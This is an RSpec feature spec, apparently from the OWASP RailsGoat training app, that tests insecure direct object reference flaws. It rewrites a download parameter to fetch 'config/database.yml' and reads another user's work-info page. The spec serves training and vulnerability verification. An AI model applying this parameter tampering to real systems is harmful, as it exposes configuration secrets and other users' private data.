require 'spec_helper'

feature 'insecure direct object reference' do
  before do
    UserFixture.reset_all_users
    @normal_user = UserFixture.normal_user
  end

  scenario 'attack one' do
    login(@normal_user)

    visit "/users/#{@normal_user.user_id}/benefit_forms"
    download_url = first('.widget-body a')[:href]
    visit download_url.sub(/name=(.*?)&/, 'name=config/database.yml&')

    pending if verifying_fixed?
    expect(page.status_code).to eq(200)
    expect(page.response_headers['Content-Disposition']).to include('database.yml')
    expect(page.response_headers['Content-Length']).to eq('709')
  end

  scenario "attack two\nTutorial: https://github.com/OWASP/railsgoat/wiki/A4-Insecure-Direct-Object-Reference" do
    login(@normal_user)

    expect(@normal_user.user_id).not_to eq(2)
    visit '/users/2/work_info'

    pending if verifying_fixed?
    expect(first('td').text).to eq('Jack Mannino')
  end
end
